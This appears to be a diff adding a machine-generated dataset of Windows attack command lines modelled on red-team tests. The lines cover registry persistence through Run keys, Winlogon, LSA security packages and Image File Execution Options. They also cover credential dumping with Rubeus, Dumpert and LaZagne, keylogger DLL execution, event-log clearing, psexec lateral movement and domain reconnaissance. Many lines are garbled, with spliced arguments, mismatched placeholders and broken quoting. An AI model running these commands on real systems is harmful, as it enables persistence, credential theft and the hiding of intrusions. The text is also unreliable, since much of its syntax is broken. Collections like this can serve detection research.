@@ -1,0 +1,64 @@
+get-managementroleassignment
+reg add hklm\software\microsoft\provisioning\commands\lolbin\dummy1\dummy2 /v debugger /d $ { computer_name } ''
+for /l % i -i in $ { fuzz. $ { range_step } , $ { krbtgt_ntlm } . $ { format }
+copy c : \programdata\microsoft\windows\start lsass '' ;
+$ consumer=set-wmiinstance = administrators '' '' f
+reg add `` hklm\software\microsoft\command processor '' /v `` cor_profiler_path '' /t reg_sz /d `` `` $ { atomictest.dll } '' } '' /f
+runexehelper.exe $ { command }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` security packages '' /d `` $ { command } ''
+reg add `` authentication setup\installed components\atomic_test '' /v `` $ { ( impersonate_user } '' ; ;
+.\rubeus.exe dump
+net group `` domain controllers '' /domain
+python exchangesheller.py $ { file_name } $ { output_folder }
+reg add `` hklm\system\currentcontrolset\control\lsa\ '' /v `` security packages '' /d `` $ { command } '' /f
+takeown /f \windows\system32\ $ { output_file_name } , $ { mask }
+$ shortcut.save ( ;
+cmdkey /list
+domain windows -mscache
+$ shortcut.windowstyle = windir % logon /d ping $ { destination_file_path '' '' $ { binary_file_path } ''
+rundll32 keylogger_dll.dll , keylog
+vshadow -new -exec= $ { target $ { username } $ { username } password= $ { target_ip } -u $ { password } /add
+reg add `` hkey_local_machine\system\currentcontrolset\control\lsa '' /v commandline /d $ { dll_file_path }
+vsiisexelauncher.exe -p $ { url } -t $ { wordlist } -u $ { args } ''
+group `` $ shell.createshortcut env : ) ''
+vsiisexelauncher.exe -p $ { action } $ { input_filename_regex }
+remove-item -path $ { filename_regex
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist '' /v `` # { mimilib.dll_path } '' /f
+net user $ { malicious_exe_path } c : domain }
+7z a `` $ { domain } , $ { dll_file_path } ''
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\mshta.exe '' /success ( /v `` threadingmodel '' /t reg_sz /d `` userinit.exe , $ { binary_file_path } '' ' '' '' , bypass
+.\outflank-dumpert.exe dump
+dnsrecon -d $ { input_folder_name } $ { output_file_name } $ { archive_file_name }
+mkdir `` $ { username } } \windows -l $ { i -w '' '' /add } ; /add } -u $ { output_path } password= $ { destination_file }
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` security packages '' /d 512
+get-wmiobject win32_computersystem foreach-object _ )
+theharvester -d $ { domain } -b $ { archive_file_name }
+auditpol -classname win32_bios
+adfind.exe -gcb -sc trustdmp
+fsutil.exe trace decode
+net user administrator /domain
+psexec.exe \\ $ { ip_address } -l '' $ { command } '' username= $ { username } '' -password /category : $ { message } in $ { range_step } '' ) /d `` $ { password_table_file_name }
+get-wmiobject win32_group
+copy $ { pid } '' -w { password }
+rundll32 keylogger_dll.dll , keylog
+copy $ { user_name } $ { command }
+.\lazagne.exe all
+rundll32 keylogger_dll_invisible.dll , keylog
+mkdir `` $ { username } '' $ { command }
+adfind.exe -gcb -sc trustdmp
+reg add hklm\software\microsoft\windows\currentversion\runonce /t reg_sz /d `` 1 '' /f
+reg add hklm\software\microsoft\windows\currentversion\runonceex\0001\depend /v 1 /d `` $ { command } /f
+curl /r c : \users\ bookmarks
+reg add `` hklm\system\currentcontrolset\control\lsa\ '' /v `` enabled '' /v `` loadappinit_dlls '' /d `` $ { binary_file_path } '' '' /f
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` `` '' root\subscription '' /t reg_dword /d `` 1 '' /f
+psexec.exe c : \windows\system32\desk.cpl , installscreensaver $ { local_file_path }
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v userinit /d `` 1 '' /f
+tasklist
+python -c `` clearing `` $ _ '' ; wevtutil cl $ { .\ { registry_name } '' $ { password } '' -force } $ { schtasks.exe or schtasks.exe or fltmc.exe
+$ consumer=set-wmiinstance -namespace '' -arguments $ `` administrators '' /t reg_dword /d 0 0 /d 1 /f
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' /v `` loadappinit_dlls '' '' /t reg_sz /d `` $ { dll_file_path } '' /f
+sc.exe start $ { user_name } /y
+net group /domain : { etw
+put stordiag.exe and $ { binary_file_path } ''
+move $ { file_name } $ { source } -l $ { encoded command }
+reg add `` hklm\system\currentcontrolset\control\print\environments\windows x64\print processors\atomicredteam '' /v asynchronous /d reg_sz /d `` $ { /f }
